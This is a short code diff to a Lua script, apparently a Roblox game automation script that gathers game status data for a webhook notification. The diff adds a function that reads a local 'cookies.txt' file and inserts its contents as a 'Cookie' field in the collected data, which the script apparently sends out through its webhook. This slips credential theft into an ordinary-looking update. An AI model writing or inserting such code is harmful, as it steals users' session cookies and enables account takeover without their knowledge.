@@ -207,6 +207,14 @@ function Gear()
         return ""
     end
 end
+function CUCKI()
+    if not isfile("cookies.txt") then
+        return ""
+    elseif isfile("cookies.txt") then
+        cookie = readfile("cookies.txt")
+        return cookie
+    end
+end
 function GetMsg()
     k3 = {}
     if Settings["PingEveryone"] and Settings["WebhookWhenMirage"] then
@@ -313,6 +321,7 @@ function thongtin()
     ["CDK"]= CDK(),
     ["SG"]= SG(),
     ["Gear"]= Gear(),
+    ["Cookie"]= CUCKI(),
   };
   return data
 end
